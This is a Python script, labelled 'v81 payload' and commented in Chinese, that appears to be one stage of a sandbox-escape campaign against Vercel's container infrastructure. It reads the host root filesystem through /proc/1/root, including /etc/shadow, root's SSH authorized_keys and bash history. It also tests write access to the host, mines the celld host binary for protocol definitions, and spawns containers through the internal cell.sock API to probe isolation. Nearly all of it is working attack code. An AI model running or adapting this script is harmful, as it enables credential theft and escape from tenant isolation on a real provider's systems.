# -*- coding: utf-8 -*-
"""v81 payload: /proc/1/root 宿主 rootfs 深挖 + celld 二进制改进分析 + 写权限测试 + Exec unix socket 回连
v80 发现: celld=宿主 pid1, /proc/1/root/opt/vercel/celld 可读(36MB) -> 宿主 rootfs 可读
目标: (a) 宿主敏感文件/配置/socket (b) celld proto 字段真定义 (c) /proc/1/root 写权限 (d) Exec unix socket 互通"""
import socket, time, os, json, struct, re

OUT = '/vercel/sandbox/v81c.out'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v81c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def rpc_raw(path, body=b'', ct='application/json', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n' % (path, ct, len(body)))
        s.sendall(req.encode() + body)
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', '', b''
        head, _, rest = data.partition(b'\r\n\r\n')
        lines = head.decode(errors='replace').split('\r\n')
        return lines[0], '\n'.join(lines[1:])[:120], rest
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, '', b''


def rpc(path, body='{}', t=3):
    st, hd, bd = rpc_raw(path, body.encode(), 'application/json', t)
    return st, bd[:600].decode(errors='replace')


def ls_r(path, lim=60):
    """ls 宿主 rootfs 目录, 返回条目字符串"""
    try:
        names = sorted(os.listdir(path))
        out = []
        for n in names[:lim]:
            try:
                st = os.stat(path + '/' + n)
                out.append('%s %s %s' % ('d' if st.st_mode & 0o40000 else '-', st.st_size, n))
            except Exception as e:
                out.append('? %s (%s)' % (n, e))
        return '; '.join(out)
    except Exception as e:
        return 'ERR %s' % e


def main():
    log('V81 payload start pid=%d' % os.getpid())
    CTR = '/vercel.hive.cell.api.containers.v1.ContainersService'
    R = '/proc/1/root'

    # === A. 宿主 rootfs 侦察 ===
    for p in ('/opt/vercel', '/opt/vercel/bin', '/opt/vercel/lib', '/root', '/root/.ssh',
              '/etc/vercel', '/var/lib/vercel', '/run', '/run/cell', '/run/containerd', '/tmp',
              '/home', '/etc', '/data'):
        log('LS %s -> %s' % (p, ls_r(R + p, 40)))
        time.sleep(0.1)

    # 敏感文件读 (只读探测)
    for p in ('/etc/hostname', '/etc/shadow', '/etc/passwd', '/etc/resolv.conf',
              '/root/.bash_history', '/root/.ssh/authorized_keys',
              '/opt/vercel/cell.json', '/opt/vercel/config.json', '/etc/vercel/config.json'):
        try:
            d = open(R + p, 'rb').read(400)
            log('READ %s -> %r' % (p, d[:300]))
        except Exception as e:
            log('READ %s ERR %s' % (p, e))

    # 写权限测试
    try:
        open(R + '/tmp/v81_write_test.txt', 'w').write('v81 write test\n')
        log('WRITE /tmp/v81_write_test.txt OK')
    except Exception as e:
        log('WRITE ERR %s' % e)

    # === B. celld 二进制分析 ===
    try:
        data = open(R + '/opt/vercel/celld', 'rb').read()
        log('celld size=%d' % len(data))
        # B1: protobuf tag 计数
        idxs = [m.start() for m in re.finditer(rb'protobuf:"', data)]
        log('protobuf tags count=%d' % len(idxs))
        for i in idxs[:60]:
            log('TAG %r' % data[i:i + 110])
        # B2: 错误串上下文 (前后 25KB 可打印串)
        for needle in (b'only stdout or stderr', b'stdin not supported', b'StreamOutput'):
            ms = list(re.finditer(re.escape(needle), data))
            log('NEEDLE %r count=%d' % (needle, len(ms)))
            for m in ms[:3]:
                i = m.start()
                seg = data[max(0, i - 25000):i + 25000]
                strs = re.findall(rb'[\x20-\x7e]{5,}', seg)
                uniq = []
                seen = set()
                for s in strs:
                    k = s[:60]
                    if k in seen:
                        continue
                    seen.add(k)
                    uniq.append(s)
                log('CTX %r: %s' % (needle, ' | '.join(x.decode(errors='replace')[:70] for x in uniq[:40])))
        # B3: 字段名统计 (name=xxx / json:"xxx")
        names = re.findall(rb',name=([a-z_0-9]+)', data)
        from collections import Counter
        cnt = Counter(n.decode() for n in names)
        rel = {k: v for k, v in cnt.items() if any(x in k for x in
               ('stream', 'output', 'stdout', 'stderr', 'process', 'container', 'exec', 'stdin'))}
        log('NAME-COUNT total=%d rel=%s' % (len(names), sorted(rel.items(), key=lambda x: -x[1])[:60]))
        jtags = re.findall(rb'json:"([a-z_0-9]+),omitempty"', data)
        jcnt = Counter(j.decode() for j in jtags)
        jrel = {k: v for k, v in jcnt.items() if any(x in k for x in
                ('stream', 'output', 'stdout', 'stderr', 'process', 'container', 'exec', 'stdin'))}
        log('JSON-TAG total=%d rel=%s' % (len(jtags), sorted(jrel.items(), key=lambda x: -x[1])[:60]))
    except Exception as e:
        log('celld analysis ERR %s' % e)

    # === C. Exec + unix socket 回连测试 ===
    st, bd = rpc(CTR + '/Create', '{"drive_id":"sandbox"}')
    cid = bd.split('"containerId":"')[1].split('"')[0] if '"containerId"' in bd else None
    log('ID=%s' % (cid or 'NONE'))
    if cid:
        rpc(CTR + '/Start', '{"containerId":"%s"}' % cid, t=5)
        time.sleep(1)
        # Exec 监听 unix socket /run/v81x.sock (假设 mount ns 共享宿主 /run)
        argv = ['/bin/sh', '-c',
                'rm -f /run/v81x.sock; python3 -c "import socket,os;'
                's=socket.socket(socket.AF_UNIX);s.bind(\'/run/v81x.sock\');s.listen(1);'
                'c,a=s.accept();c.send(b\'V81_UNIX_OK\');c.close();s.close();os.unlink(\'/run/v81x.sock\')" & '
                'sleep 20']
        st, bd = exec_cmd(CTR, cid, argv, t=6)
        PA = bd.split('"processId":"')[1].split('"')[0] if '"processId"' in bd else None
        log('execA unix -> %s | PA=%s' % (st, PA or bd[:120]))
        time.sleep(2)
        # payload 尝试连接 (宿主 /run bind mount)
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect('/run/v81x.sock')
            d = s.recv(100)
            log('UNIX-CONNECT OK got=%r' % d)
            s.close()
        except Exception as e:
            log('UNIX-CONNECT ERR %s' % type(e).__name__)
        # 检查 socket 是否存在于宿主 /run
        log('LS /run/v81x.sock -> %s' % ls_r(R + '/run', 200))
        # 检查宿主 /proc 有无新进程 (sock 侧)
        try:
            os.path.exists('/run/v81x.sock') and log('host /run/v81x.sock EXISTS')
        except Exception:
            pass
        rpc(CTR + '/Kill', '{"containerId":"%s"}' % cid)
        log('killed')

    log('V81C_DONE')


def exec_cmd(ctr, cid, argv, t=6):
    body = json.dumps({"containerId": cid, "process": {"argv": argv}})
    return rpc(ctr + '/Exec', body, t=t)


main()
